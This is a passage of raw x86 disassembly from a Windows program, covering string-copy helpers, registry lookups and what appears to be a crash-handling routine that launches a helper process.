  40756d:	dec    esi
  40756e:	jns    0x407566
  407570:	test   esi,esi
  407572:	push   0x1
  407574:	jle    0x4075c8
  407576:	lea    eax,[esi*2+0xa]
  40757d:	push   eax
  40757e:	call   DWORD PTR ds:0x424424
  407584:	mov    edi,eax
  407586:	add    esp,0x8
  407589:	test   edi,edi
  40758b:	je     0x407616
  407591:	lea    eax,[esi*2+0x2]
  407598:	push   eax
  407599:	push   ebx
  40759a:	push   edi
  40759b:	call   0x40db6c
  4075a0:	add    esp,0xc
  4075a3:	lea    eax,[esi+0x5]
  4075a6:	sub    eax,esi
  4075a8:	dec    eax
  4075a9:	push   0x401a50
  4075ae:	push   eax
  4075af:	lea    eax,[esi+0x1]
  4075b2:	lea    eax,[edi+eax*2]
  4075b5:	push   eax
  4075b6:	call   DWORD PTR ds:0x4244b8
  4075bc:	add    esp,0xc
  4075bf:	mov    eax,edi
  4075c1:	pop    edi
  4075c2:	pop    esi
  4075c3:	pop    ebx
  4075c4:	mov    esp,ebp
  4075c6:	pop    ebp
  4075c7:	ret    
  4075c8:	lea    esi,[edx+0x5]
  4075cb:	mov    DWORD PTR [ebp-0x4],esi
  4075ce:	lea    eax,[esi+esi*1]
  4075d1:	push   eax
  4075d2:	call   DWORD PTR ds:0x424424
  4075d8:	mov    edi,eax
  4075da:	add    esp,0x8
  4075dd:	test   edi,edi
  4075df:	je     0x407627
  4075e1:	push   ebx
  4075e2:	push   esi
  4075e3:	push   edi
  4075e4:	call   DWORD PTR ds:0x4244b8
  4075ea:	add    esp,0xc
  4075ed:	push   0x4011c4
  4075f2:	push   esi
  4075f3:	mov    esi,DWORD PTR ds:0x4244b4
  4075f9:	push   edi
  4075fa:	call   esi
  4075fc:	add    esp,0xc
  4075ff:	push   0x401a50
  407604:	push   DWORD PTR [ebp-0x4]
  407607:	push   edi
  407608:	call   esi
  40760a:	add    esp,0xc
  40760d:	mov    eax,edi
  40760f:	pop    edi
  407610:	pop    esi
  407611:	pop    ebx
  407612:	mov    esp,ebp
  407614:	pop    ebp
  407615:	ret    
  407616:	push   0x0
  407618:	mov    edx,0x4010c0
  40761d:	mov    ecx,0x5e5
  407622:	call   0x407010
  407627:	push   0x0
  407629:	mov    edx,0x4010c0
  40762e:	mov    ecx,0x5e5
  407633:	call   0x407010
  407638:	int3   
  407639:	int3   
  40763a:	int3   
  40763b:	int3   
  40763c:	int3   
  40763d:	int3   
  40763e:	int3   
  40763f:	int3   
  407640:	push   ebp
  407641:	mov    ebp,esp
  407643:	sub    esp,0x8
  407646:	push   ebx
  407647:	push   esi
  407648:	push   edi
  407649:	mov    edi,DWORD PTR ds:0x424424
  40764f:	push   0x1
  407651:	push   0x9
  407653:	mov    BYTE PTR [ebp-0x1],dl
  407656:	mov    ebx,ecx
  407658:	call   edi
  40765a:	mov    esi,eax
  40765c:	add    esp,0x8
  40765f:	test   esi,esi
  407661:	je     0x4076c5
  407663:	mov    edx,0x40e438
  407668:	mov    ecx,ebx
  40766a:	call   0x409e70
  40766f:	mov    edx,eax
  407671:	mov    DWORD PTR [ebp-0x8],eax
  407674:	lea    eax,[edx+0x2]
  407677:	mov    cx,WORD PTR [edx]
  40767a:	add    edx,0x2
  40767d:	test   cx,cx
  407680:	jne    0x407677
  407682:	sub    edx,eax
  407684:	sar    edx,1
  407686:	push   0x1
  407688:	lea    ebx,[edx+0x1]
  40768b:	lea    eax,[ebx+ebx*1]
  40768e:	push   eax
  40768f:	call   edi
  407691:	mov    edi,eax
  407693:	add    esp,0x8
  407696:	test   edi,edi
  407698:	je     0x4076d6
  40769a:	push   DWORD PTR [ebp-0x8]
  40769d:	push   ebx
  40769e:	push   edi
  40769f:	call   DWORD PTR ds:0x4244b8
  4076a5:	mov    al,BYTE PTR [ebp-0x1]
  4076a8:	add    esp,0xc
  4076ab:	mov    BYTE PTR [esi+0x8],al
  4076ae:	mov    eax,ds:0x40e434
  4076b3:	mov    DWORD PTR [esi+0x4],edi
  4076b6:	pop    edi
  4076b7:	mov    DWORD PTR [esi],eax
  4076b9:	mov    DWORD PTR ds:0x40e434,esi
  4076bf:	pop    esi
  4076c0:	pop    ebx
  4076c1:	mov    esp,ebp
  4076c3:	pop    ebp
  4076c4:	ret    
  4076c5:	push   0x0
  4076c7:	mov    edx,0x4010c0
  4076cc:	mov    ecx,0x5e5
  4076d1:	call   0x407010
  4076d6:	push   0x0
  4076d8:	mov    edx,0x4010c0
  4076dd:	mov    ecx,0x5e5
  4076e2:	call   0x407010
  4076e7:	int3   
  4076e8:	int3   
  4076e9:	int3   
  4076ea:	int3   
  4076eb:	int3   
  4076ec:	int3   
  4076ed:	int3   
  4076ee:	int3   
  4076ef:	int3   
  4076f0:	push   ecx
  4076f1:	call   0x40a7f0
  4076f6:	cmp    al,0xff
  4076f8:	jne    0x4076fe
  4076fa:	xor    al,al
  4076fc:	pop    ecx
  4076fd:	ret    
  4076fe:	mov    al,ds:0x40e8cd
  407703:	test   al,al
  407705:	je     0x40770f
  407707:	cmp    al,0x16
  407709:	jne    0x40779a
  40770f:	movzx  eax,BYTE PTR ds:0x40e8d2
  407716:	sub    eax,0x2
  407719:	je     0x40772c
  40771b:	sub    eax,0x2
  40771e:	je     0x40772c
  407720:	mov    BYTE PTR ds:0x40e690,0x0
  407727:	sub    eax,0x3
  40772a:	jne    0x407733
  40772c:	mov    BYTE PTR ds:0x40e690,0x1
  407733:	mov    al,ds:0x40e8cf
  407738:	cmp    al,0x1
  40773a:	jne    0x407746
  40773c:	cmp    BYTE PTR ds:0x40e8ce,al
  407742:	je     0x407760
  407744:	jmp    0x4077ac
  407746:	cmp    al,0x2
  407748:	jne    0x407753
  40774a:	cmp    BYTE PTR ds:0x40e8ce,0x0
  407751:	jmp    0x407742
  407753:	cmp    al,0x3
  407755:	jne    0x4077ac
  407757:	cmp    BYTE PTR ds:0x40e8ce,0x0
  40775e:	jne    0x4077ac
  407760:	cmp    WORD PTR ds:0x40e8e0,0x0
  407768:	je     0x40777e
  40776a:	cmp    WORD PTR ds:0x40e8e2,0x3a
  407772:	jne    0x40777e
  407774:	cmp    WORD PTR ds:0x40e8e4,0x5c
  40777c:	je     0x407796
  40777e:	push   0x40e438
  407783:	push   0x104
  407788:	push   0x40e8e0
  40778d:	call   DWORD PTR ds:0x4244b8
  407793:	add    esp,0xc
  407796:	mov    al,0x1
  407798:	pop    ecx
  407799:	ret    
  40779a:	mov    edx,DWORD PTR ds:0x40e8dc
  4077a0:	push   0x0
  4077a2:	mov    ecx,0x5e6
  4077a7:	call   0x407010
  4077ac:	mov    edx,DWORD PTR ds:0x40e8dc
  4077b2:	push   0x0
  4077b4:	mov    ecx,0x5e6
  4077b9:	call   0x407010
  4077be:	int3   
  4077bf:	int3   
  4077c0:	mov    eax,ds:0x40e654
  4077c5:	test   eax,eax
  4077c7:	jle    0x4077e5
  4077c9:	cmp    eax,0x2
  4077cc:	jle    0x4077e2
  4077ce:	cmp    eax,0x3
  4077d1:	jne    0x4077e5
  4077d3:	call   0x4077f0
  4077d8:	xor    ecx,ecx
  4077da:	test   al,al
  4077dc:	sete   cl
  4077df:	mov    al,cl
  4077e1:	ret    
  4077e2:	xor    al,al
  4077e4:	ret    
  4077e5:	mov    al,0x1
  4077e7:	ret    
  4077e8:	int3   
  4077e9:	int3   
  4077ea:	int3   
  4077eb:	int3   
  4077ec:	int3   
  4077ed:	int3   
  4077ee:	int3   
  4077ef:	int3   
  4077f0:	push   ebp
  4077f1:	mov    ebp,esp
  4077f3:	sub    esp,0x10
  4077f6:	call   DWORD PTR ds:0x4242c8
  4077fc:	cmp    al,0x6
  4077fe:	jb     0x407806
  407800:	mov    al,0x1
  407802:	mov    esp,ebp
  407804:	pop    ebp
  407805:	ret    
  407806:	lea    eax,[ebp-0x4]
  407809:	push   eax
  40780a:	push   0x20019
  40780f:	push   0x0
  407811:	push   0x4011c8
  407816:	push   0x80000001
  40781b:	call   DWORD PTR ds:0x4242a8
  407821:	test   eax,eax
  407823:	jne    0x407872
  407825:	push   esi
  407826:	lea    eax,[ebp-0x8]
  407829:	push   eax
  40782a:	lea    eax,[ebp-0x10]
  40782d:	push   eax
  40782e:	lea    eax,[ebp-0xc]
  407831:	push   eax
  407832:	push   0x0
  407834:	push   0x401220
  407839:	push   DWORD PTR [ebp-0x4]
  40783c:	mov    DWORD PTR [ebp-0x8],0x4
  407843:	call   DWORD PTR ds:0x4242a0
  407849:	push   DWORD PTR [ebp-0x4]
  40784c:	mov    esi,eax
  40784e:	call   DWORD PTR ds:0x4242a4
  407854:	test   esi,esi
  407856:	pop    esi
  407857:	jne    0x407872
  407859:	cmp    DWORD PTR [ebp-0xc],0x4
  40785d:	jne    0x407872
  40785f:	cmp    DWORD PTR [ebp-0x8],0x4
  407863:	jne    0x407872
  407865:	xor    eax,eax
  407867:	cmp    DWORD PTR [ebp-0x10],0x1
  40786b:	sete   al
  40786e:	mov    esp,ebp
  407870:	pop    ebp
  407871:	ret    
  407872:	xor    al,al
  407874:	mov    esp,ebp
  407876:	pop    ebp
  407877:	ret    
  407878:	int3   
  407879:	int3   
  40787a:	int3   
  40787b:	int3   
  40787c:	int3   
  40787d:	int3   
  40787e:	int3   
  40787f:	int3   
  407880:	push   ebp
  407881:	mov    ebp,esp
  407883:	xor    eax,eax
  407885:	sub    esp,0xc
  407888:	cmp    eax,0x422bc0
  40788d:	je     0x407917
  407893:	lea    eax,[ebp-0x4]
  407896:	push   eax
  407897:	push   0x20019
  40789c:	push   0x0
  40789e:	push   0x401258
  4078a3:	push   0x80000002
  4078a8:	call   DWORD PTR ds:0x4242a8
  4078ae:	test   eax,eax
  4078b0:	jne    0x407917
  4078b2:	push   esi
  4078b3:	lea    eax,[ebp-0x8]
  4078b6:	push   eax
  4078b7:	push   0x422bc0
  4078bc:	lea    eax,[ebp-0xc]
  4078bf:	push   eax
  4078c0:	push   0x0
  4078c2:	push   0x4012c8
  4078c7:	push   DWORD PTR [ebp-0x4]
  4078ca:	mov    DWORD PTR [ebp-0x8],0x208
  4078d1:	call   DWORD PTR ds:0x4242a0
  4078d7:	push   DWORD PTR [ebp-0x4]
  4078da:	mov    esi,eax
  4078dc:	call   DWORD PTR ds:0x4242a4
  4078e2:	xor    eax,eax
  4078e4:	test   esi,esi
  4078e6:	mov    ds:0x422dc6,ax
  4078ec:	pop    esi
  4078ed:	jne    0x407917
  4078ef:	mov    eax,DWORD PTR [ebp-0xc]
  4078f2:	cmp    eax,0x2
  4078f5:	jne    0x40791d
  4078f7:	push   0x104
  4078fc:	push   0x422bc0
  407901:	push   0x422bc0
  407906:	call   DWORD PTR ds:0x4242cc
  40790c:	cmp    eax,0x104
  407911:	ja     0x407917
  407913:	test   eax,eax
  407915:	jne    0x407922
  407917:	xor    al,al
  407919:	mov    esp,ebp
  40791b:	pop    ebp
  40791c:	ret    
  40791d:	cmp    eax,0x1
  407920:	jne    0x407917
  407922:	mov    al,0x1
  407924:	mov    esp,ebp
  407926:	pop    ebp
  407927:	ret    
  407928:	int3   
  407929:	int3   
  40792a:	int3   
  40792b:	int3   
  40792c:	int3   
  40792d:	int3   
  40792e:	int3   
  40792f:	int3   
  407930:	push   0x0
  407932:	push   0x9c9c
  407937:	push   0x0
  407939:	push   0x4
  40793b:	push   0x416f2c
  407940:	push   0xffffffff
  407942:	call   DWORD PTR ds:0x4242d0
  407948:	mov    ds:0x40e64c,eax
  40794d:	test   eax,eax
  40794f:	je     0x40797f
  407951:	push   0x0
  407953:	push   0x0
  407955:	push   0x0
  407957:	push   0x6
  407959:	push   eax
  40795a:	call   DWORD PTR ds:0x4242d4
  407960:	mov    ds:0x40e650,eax
  407965:	test   eax,eax
  407967:	jne    0x407982
  407969:	push   DWORD PTR ds:0x40e64c
  40796f:	call   DWORD PTR ds:0x4242d8
  407975:	mov    DWORD PTR ds:0x40e64c,0x0
  40797f:	xor    al,al
  407981:	ret    
  407982:	mov    al,0x1
  407984:	ret    
  407985:	int3   
  407986:	int3   
  407987:	int3   
  407988:	int3   
  407989:	int3   
  40798a:	int3   
  40798b:	int3   
  40798c:	int3   
  40798d:	int3   
  40798e:	int3   
  40798f:	int3   
  407990:	push   ebp
  407991:	mov    ebp,esp
  407993:	sub    esp,0x60
  407996:	mov    eax,ds:0x40e018
  40799b:	xor    eax,ebp
  40799d:	mov    DWORD PTR [ebp-0x4],eax
  4079a0:	cmp    DWORD PTR ds:0x422b78,0x0
  4079a7:	mov    DWORD PTR [ebp-0x60],ecx
  4079aa:	mov    DWORD PTR [ebp-0x54],0x0
  4079b1:	mov    DWORD PTR [ebp-0x5c],0x1
  4079b8:	jne    0x407dfd
  4079be:	mov    eax,ds:0x40e654
  4079c3:	test   eax,eax
  4079c5:	jle    0x407dfd
  4079cb:	cmp    eax,0x2
  4079ce:	jle    0x4079eb
  4079d0:	cmp    eax,0x3
  4079d3:	jne    0x407dfd
  4079d9:	call   0x4077f0
  4079de:	test   al,al
  4079e0:	sete   al
  4079e3:	test   al,al
  4079e5:	jne    0x407dfd
  4079eb:	cmp    DWORD PTR ds:0x40e650,0x0
  4079f2:	mov    DWORD PTR ds:0x416f2c,0xc
  4079fc:	mov    DWORD PTR ds:0x416f30,0x0
  407a06:	mov    DWORD PTR ds:0x416f34,0x1
  407a10:	jne    0x407a1f
  407a12:	call   0x407930
  407a17:	test   al,al
  407a19:	je     0x407dfd
  407a1f:	call   0x407880
  407a24:	test   al,al
  407a26:	je     0x407dfd
  407a2c:	push   ebx
  407a2d:	push   esi
  407a2e:	mov    esi,DWORD PTR ds:0x4242dc
  407a34:	push   edi
  407a35:	push   0x0
  407a37:	push   0x0
  407a39:	push   0x0
  407a3b:	push   0x416f2c
  407a40:	call   esi
  407a42:	push   0x0
  407a44:	push   0x0
  407a46:	push   0x0
  407a48:	push   0x416f2c
  407a4d:	mov    ds:0x422b78,eax
  407a52:	call   esi
  407a54:	push   0x0
  407a56:	push   0x0
  407a58:	mov    ebx,eax
  407a5a:	push   0x416f2c
  407a5f:	mov    DWORD PTR [ebp-0x58],ebx
  407a62:	call   DWORD PTR ds:0x4242e0
  407a68:	mov    edi,eax
  407a6a:	mov    DWORD PTR [ebp-0x50],edi
  407a6d:	call   DWORD PTR ds:0x4242e4
  407a73:	push   0x0
  407a75:	push   0x1
  407a77:	push   0x1fffff
  407a7c:	lea    ecx,[ebp-0x54]
  407a7f:	push   ecx
  407a80:	push   eax
  407a81:	push   eax
  407a82:	push   eax
  407a83:	call   DWORD PTR ds:0x4242e8
  407a89:	mov    esi,DWORD PTR ds:0x4242d8
  407a8f:	test   eax,eax
  407a91:	je     0x407d0a
  407a97:	cmp    DWORD PTR ds:0x422b78,0x0
  407a9e:	je     0x407d0a
  407aa4:	test   ebx,ebx
  407aa6:	je     0x407d11
  407aac:	test   edi,edi
  407aae:	je     0x407d0a
  407ab4:	cmp    DWORD PTR [ebp-0x54],0x0
  407ab8:	je     0x407d0a
  407abe:	mov    esi,DWORD PTR ds:0x40e650
  407ac4:	push   0x9c9c
  407ac9:	push   0x0
  407acb:	push   esi
  407acc:	call   0x40db72
  407ad1:	mov    eax,DWORD PTR [ebp-0x54]
  407ad4:	add    esp,0xc
  407ad7:	mov    DWORD PTR [esi+0x28],eax
  407ada:	call   DWORD PTR ds:0x4242ec
  407ae0:	mov    ecx,DWORD PTR ds:0x40e650
  407ae6:	mov    DWORD PTR [ecx+0x8],eax
  407ae9:	call   DWORD PTR ds:0x4242f0
  407aef:	mov    ecx,DWORD PTR ds:0x40e650
  407af5:	mov    DWORD PTR [ecx+0xc],eax
  407af8:	mov    eax,ds:0x422b78
  407afd:	mov    DWORD PTR [ecx+0x20],eax
  407b00:	mov    eax,DWORD PTR [ebp-0x60]
  407b03:	mov    DWORD PTR [ecx+0x18],ebx
  407b06:	mov    DWORD PTR [ecx+0x24],edi
  407b09:	mov    DWORD PTR [ecx],0x9c9c
  407b0f:	mov    DWORD PTR [ecx+0x4],0x20000
  407b16:	mov    DWORD PTR [ecx+0x14],eax
  407b19:	mov    eax,DWORD PTR [eax]
  407b1b:	mov    eax,DWORD PTR [eax+0xc]
  407b1e:	mov    DWORD PTR [ecx+0x10],eax
  407b21:	call   DWORD PTR ds:0x4242c8
  407b27:	cmp    al,0x6
  407b29:	mov    eax,ds:0x40e654
  407b2e:	setae  cl
  407b31:	dec    eax
  407b32:	je     0x407b67
  407b34:	dec    eax
  407b35:	je     0x407b4e
  407b37:	dec    eax
  407b38:	jne    0x407d04
  407b3e:	mov    edx,DWORD PTR ds:0x40e650
  407b44:	test   cl,cl
  407b46:	sete   al
  407b49:	mov    DWORD PTR [edx+0x30],eax
  407b4c:	jmp    0x407b74
  407b4e:	mov    edx,DWORD PTR ds:0x40e650
  407b54:	xor    eax,eax
  407b56:	test   cl,cl
  407b58:	sete   al
  407b5b:	mov    DWORD PTR [edx+0x2c],0x8
  407b62:	mov    DWORD PTR [edx+0x30],eax
  407b65:	jmp    0x407b7b
  407b67:	mov    edx,DWORD PTR ds:0x40e650
  407b6d:	mov    DWORD PTR [edx+0x30],0x0
  407b74:	mov    DWORD PTR [edx+0x2c],0x0
  407b7b:	mov    cl,BYTE PTR ds:0x40e642
  407b81:	xor    eax,eax
  407b83:	test   cl,cl
  407b85:	setne  al
  407b88:	mov    ebx,DWORD PTR ds:0x42439c
  407b8e:	push   0xffffffff
  407b90:	push   DWORD PTR ds:0x40e030
  407b96:	mov    DWORD PTR [edx+0x34],0x0
  407b9d:	push   0x38
  407b9f:	mov    DWORD PTR [edx+0x3c],0x0
  407ba6:	dec    eax
  407ba7:	and    eax,0x10
  407baa:	or     eax,0x4
  407bad:	mov    DWORD PTR [edx+0x38],eax
  407bb0:	movzx  eax,cl
  407bb3:	neg    eax
  407bb5:	sbb    eax,eax
  407bb7:	and    eax,0x10
  407bba:	or     eax,0x1
  407bbd:	mov    DWORD PTR [edx+0x4c],eax
  407bc0:	lea    eax,[edx+0x21ac]
  407bc6:	push   eax
  407bc7:	mov    DWORD PTR [edx+0x44],0x1
  407bce:	call   ebx
  407bd0:	mov    eax,ds:0x4243a0
  407bd5:	push   0xffffffff
  407bd7:	push   DWORD PTR [eax]
  407bd9:	mov    eax,ds:0x40e650
  407bde:	add    eax,0x258
  407be3:	push   0x104
  407be8:	push   eax
  407be9:	call   ebx
  407beb:	push   0x48
  407bed:	lea    eax,[ebp-0x4c]
  407bf0:	push   eax
  407bf1:	mov    eax,ds:0x40e650
  407bf6:	add    eax,0x460
  407bfb:	push   0x104
  407c00:	mov    ecx,0x12
  407c05:	mov    esi,0x4012d8
  407c0a:	lea    edi,[ebp-0x4c]
  407c0d:	push   eax
  407c0e:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c10:	call   DWORD PTR ds:0x4243a4
  407c16:	mov    eax,ds:0x40e650
  407c1b:	push   0xffffffff
  407c1d:	push   DWORD PTR ds:0x40e034
  407c23:	add    eax,0x7a4
  407c28:	push   0x104
  407c2d:	push   eax
  407c2e:	call   ebx
  407c30:	add    esp,0x40
  407c33:	push   DWORD PTR ds:0x40e64c
  407c39:	push   0x401320
  407c3e:	push   0x104
  407c43:	push   0x422dc8
  407c48:	call   DWORD PTR ds:0x4243a8
  407c4e:	push   0x44
  407c50:	push   0x0
  407c52:	push   0x422fd0
  407c57:	call   0x40db72
  407c5c:	add    esp,0x1c
  407c5f:	mov    DWORD PTR ds:0x422fd0,0x44
  407c69:	push   0x423014
  407c6e:	push   0x422fd0
  407c73:	push   0x0
  407c75:	push   0x0
  407c77:	push   0x4000020
  407c7c:	push   0x1
  407c7e:	push   0x0
  407c80:	push   0x0
  407c82:	push   0x422dc8
  407c87:	push   0x422bc0
  407c8c:	call   DWORD PTR ds:0x4242f4
  407c92:	mov    esi,DWORD PTR ds:0x4242d8
  407c98:	test   eax,eax
  407c9a:	je     0x407de1
  407ca0:	push   DWORD PTR ds:0x423014
  407ca6:	call   esi
  407ca8:	push   DWORD PTR ds:0x423018
  407cae:	call   esi
  407cb0:	mov    esi,DWORD PTR ds:0x4242f8
  407cb6:	mov    edi,DWORD PTR [ebp-0x58]
  407cb9:	mov    bl,0x1
  407cbb:	jmp    0x407cc0
  407cbd:	lea    ecx,[ecx+0x0]
  407cc0:	push   0x4e20
  407cc5:	push   DWORD PTR ds:0x422b78
  407ccb:	call   esi
  407ccd:	test   eax,eax
  407ccf:	jne    0x407d7c
  407cd5:	push   0x1
  407cd7:	push   edi
  407cd8:	call   esi
  407cda:	test   eax,eax
  407cdc:	jne    0x407dc5
  407ce2:	mov    edi,DWORD PTR [ebp-0x50]
  407ce5:	mov    eax,ds:0x40e650
  407cea:	mov    ebx,DWORD PTR [ebp-0x58]
  407ced:	mov    al,BYTE PTR [eax+0x9a84]
  407cf3:	and    al,0x10
  407cf5:	movzx  eax,al
  407cf8:	neg    eax
  407cfa:	sbb    eax,eax
  407cfc:	not    eax
  407cfe:	and    eax,0x1
  407d01:	mov    DWORD PTR [ebp-0x5c],eax
  407d04:	mov    esi,DWORD PTR ds:0x4242d8
  407d0a:	test   ebx,ebx
  407d0c:	je     0x407d11
  407d0e:	push   ebx
  407d0f:	call   esi
  407d11:	test   edi,edi
  407d13:	je     0x407d18
  407d15:	push   edi
  407d16:	call   esi
  407d18:	mov    eax,DWORD PTR [ebp-0x54]
  407d1b:	test   eax,eax
  407d1d:	je     0x407d22
  407d1f:	push   eax
  407d20:	call   esi
  407d22:	mov    eax,ds:0x422b78
  407d27:	test   eax,eax
  407d29:	je     0x407d38
  407d2b:	push   eax
  407d2c:	call   esi
  407d2e:	mov    DWORD PTR ds:0x422b78,0x0
  407d38:	mov    eax,ds:0x40e650
  407d3d:	test   eax,eax
  407d3f:	je     0x407d52
  407d41:	push   eax
  407d42:	call   DWORD PTR ds:0x424304
  407d48:	mov    DWORD PTR ds:0x40e650,0x0
  407d52:	mov    eax,ds:0x40e64c
  407d57:	test   eax,eax
  407d59:	je     0x407d68
  407d5b:	push   eax
  407d5c:	call   esi
  407d5e:	mov    DWORD PTR ds:0x40e64c,0x0
  407d68:	cmp    BYTE PTR ds:0x40e029,0x0
  407d6f:	pop    edi
  407d70:	pop    esi
  407d71:	pop    ebx
  407d72:	je     0x407dec
  407d74:	push   0x1
  407d76:	call   DWORD PTR ds:0x424394
  407d7c:	push   0x4e20
  407d81:	push   DWORD PTR [ebp-0x50]
  407d84:	call   esi
  407d86:	cmp    eax,0x102
  407d8b:	je     0x407ce2
  407d91:	cmp    eax,0x80
  407d96:	je     0x407dd2
  407d98:	push   0x1
  407d9a:	push   DWORD PTR ds:0x422b78
  407da0:	call   esi
  407da2:	test   eax,eax
  407da4:	je     0x407db1
  407da6:	push   edi
  407da7:	call   DWORD PTR ds:0x424300
  407dad:	xor    bl,bl
  407daf:	jmp    0x407dbc
  407db1:	push   0x1
  407db3:	push   edi
  407db4:	call   esi
  407db6:	neg    eax
  407db8:	sbb    al,al
  407dba:	and    bl,al
  407dbc:	push   DWORD PTR [ebp-0x50]
  407dbf:	call   DWORD PTR ds:0x4242fc
  407dc5:	test   bl,bl
  407dc7:	jne    0x407cc0
  407dcd:	jmp    0x407ce2
  407dd2:	mov    edi,DWORD PTR [ebp-0x50]
  407dd5:	push   edi
  407dd6:	call   DWORD PTR ds:0x4242fc
  407ddc:	jmp    0x407ce5
  407de1:	mov    ebx,DWORD PTR [ebp-0x58]
  407de4:	mov    edi,DWORD PTR [ebp-0x50]
  407de7:	jmp    0x407d0a
  407dec:	mov    eax,DWORD PTR [ebp-0x5c]
  407def:	mov    ecx,DWORD PTR [ebp-0x4]
  407df2:	xor    ecx,ebp
  407df4:	call   0x40d492
  407df9:	mov    esp,ebp
  407dfb:	pop    ebp
  407dfc:	ret    
  407dfd:	mov    ecx,DWORD PTR [ebp-0x4]
  407e00:	xor    ecx,ebp
  407e02:	mov    eax,0x1
  407e07:	call   0x40d492
  407e0c:	mov    esp,ebp
  407e0e:	pop    ebp
  407e0f:	ret    
  407e10:	push   0x0
  407e12:	push   0x9c9c
  407e17:	push   0x0
  407e19:	push   0x4
  407e1b:	push   0x416f2c
  407e20:	push   0xffffffff
  407e22:	mov    DWORD PTR ds:0x416f2c,0xc
  407e2c:	mov    DWORD PTR ds:0x416f30,0x0
  407e36:	mov    DWORD PTR ds:0x416f34,0x1
  407e40:	call   DWORD PTR ds:0x4242d0
  407e46:	mov    ds:0x40e64c,eax
  407e4b:	test   eax,eax
  407e4d:	je     0x407e7d
  407e4f:	push   0x0
  407e51:	push   0x0
  407e53:	push   0x0
  407e55:	push   0x6
  407e57:	push   eax
  407e58:	call   DWORD PTR ds:0x4242d4
  407e5e:	mov    ds:0x40e650,eax
  407e63:	test   eax,eax
  407e65:	jne    0x407e7d
  407e67:	push   DWORD PTR ds:0x40e64c
  407e6d:	call   DWORD PTR ds:0x4242d8
  407e73:	mov    DWORD PTR ds:0x40e64c,0x0
  407e7d:	ret    
  407e7e:	int3   
  407e7f:	int3   
  407e80:	push   ebp
  407e81:	mov    ebp,esp
  407e83:	mov    ecx,DWORD PTR [ebp+0x8]
  407e86:	mov    eax,DWORD PTR [ecx]
  407e88:	cmp    DWORD PTR [eax],0x80000003
  407e8e:	jne    0x407e96
  407e90:	xor    eax,eax
  407e92:	pop    ebp
  407e93:	ret    0x4
  407e96:	cmp    BYTE PTR ds:0x40e643,0x0
  407e9d:	jne    0x407e90
  407e9f:	mov    BYTE PTR ds:0x40e643,0x1
  407ea6:	mov    DWORD PTR ds:0x40e034,0x401b74
  407eb0:	mov    DWORD PTR ds:0x40e030,0x401b10
  407eba:	mov    BYTE PTR ds:0x40e029,0x0
  407ec1:	call   0x407990
  407ec6:	pop    ebp
  407ec7:	ret    0x4
  407eca:	int3   
  407ecb:	int3   
  407ecc:	int3   
  407ecd:	int3   
  407ece:	int3   
  407ecf:	int3   
  407ed0:	push   ebp
  407ed1:	mov    ebp,esp
  407ed3:	cmp    BYTE PTR ds:0x40eaf1,0x0
  407eda:	push   ebx
  407edb:	push   edi
  407edc:	mov    edi,edx
  407ede:	mov    ebx,ecx
  407ee0:	jne    0x407f15
  407ee2:	mov    ecx,0x7d0
  407ee7:	mov    BYTE PTR ds:0x40eaf1,0x1
  407eee:	call   0x4096d0
  407ef3:	push   eax
  407ef4:	push   0x401968
  407ef9:	call   0x40d1c0
  407efe:	push   0x401970
  407f03:	call   0x40d1c0
  407f08:	push   0x4019a0
  407f0d:	call   0x40d1c0
  407f12:	add    esp,0x10
  407f15:	push   0x401348
  407f1a:	call   0x40d1c0
  407f1f:	add    esp,0x4
  407f22:	cmp    BYTE PTR ds:0x40e8db,0x0
  407f29:	jne    0x407f3e
  407f2b:	call   DWORD PTR ds:0x424434
  407f31:	add    eax,0x20
  407f34:	push   eax
  407f35:	call   DWORD PTR ds:0x424438
  407f3b:	add    esp,0x4
  407f3e:	push   esi
  407f3f:	mov    esi,DWORD PTR [ebx]
  407f41:	mov    ecx,0x14
  407f46:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f48:	mov    edi,DWORD PTR [ebp+0x8]
  407f4b:	test   edi,edi
  407f4d:	je     0x407f59
  407f4f:	mov    esi,DWORD PTR [ebx+0x4]
  407f52:	mov    ecx,0xb3
  407f57:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f59:	mov    eax,ds:0x40e654
  407f5e:	pop    esi
  407f5f:	test   eax,eax
  407f61:	jle    0x407fc0
  407f63:	cmp    eax,0x2
  407f66:	jle    0x407f7b
  407f68:	cmp    eax,0x3
  407f6b:	jne    0x407fc0
  407f6d:	call   0x4077f0
  407f72:	test   al,al
  407f74:	sete   al
  407f77:	test   al,al
  407f79:	jne    0x407fc0
  407f7b:	mov    eax,DWORD PTR [ebx]
  407f7d:	cmp    DWORD PTR [eax],0x80000003
  407f83:	jne    0x407f8b
  407f85:	pop    edi
  407f86:	xor    eax,eax
  407f88:	pop    ebx
  407f89:	pop    ebp
  407f8a:	ret    
  407f8b:	cmp    BYTE PTR ds:0x40e643,0x0
  407f92:	jne    0x407f85
  407f94:	pop    edi
  407f95:	mov    ecx,ebx
  407f97:	mov    BYTE PTR ds:0x40e643,0x1
  407f9e:	mov    DWORD PTR ds:0x40e034,0x401b74
  407fa8:	mov    DWORD PTR ds:0x40e030,0x401b10
  407fb2:	mov    BYTE PTR ds:0x40e029,0x0
  407fb9:	pop    ebx
  407fba:	pop    ebp
  407fbb:	jmp    0x407990
  407fc0:	xor    eax,eax
  407fc2:	cmp    BYTE PTR ds:0x40e643,al
  407fc8:	pop    edi
  407fc9:	sete   al
  407fcc:	pop    ebx
  407fcd:	pop    ebp
  407fce:	ret    
  407fcf:	int3   
  407fd0:	push   ebp
  407fd1:	mov    ebp,esp
  407fd3:	push   0xfffffffe
  407fd5:	push   0x40df98
  407fda:	push   0x40dac9
  407fdf:	mov    eax,fs:0x0
  407fe5:	push   eax
  407fe6:	sub    esp,0x558
  407fec:	mov    eax,ds:0x40e018
  407ff1:	xor    DWORD PTR [ebp-0x8],eax
  407ff4:	xor    eax,ebp
  407ff6:	mov    DWORD PTR [ebp-0x1c],eax
  407ff9:	push   ebx
  407ffa:	push   esi
  407ffb:	push   edi
  407ffc:	push   eax
  407ffd:	lea    eax,[ebp-0x10]
  408000:	mov    fs:0x0,eax
  408006:	mov    DWORD PTR [ebp-0x18],esp
  408009:	mov    edi,DWORD PTR [ebp+0x8]
  40800c:	mov    ebx,DWORD PTR [ebp+0xc]
  40800f:	mov    DWORD PTR [ebp-0x280],ebx
  408015:	push   0x1
  408017:	call   DWORD PTR ds:0x424308
  40801d:	mov    DWORD PTR [ebp-0x4],0x0
  408024:	push   0x401398
  408029:	push   0x2
  40802b:	call   DWORD PTR ds:0x4243ac
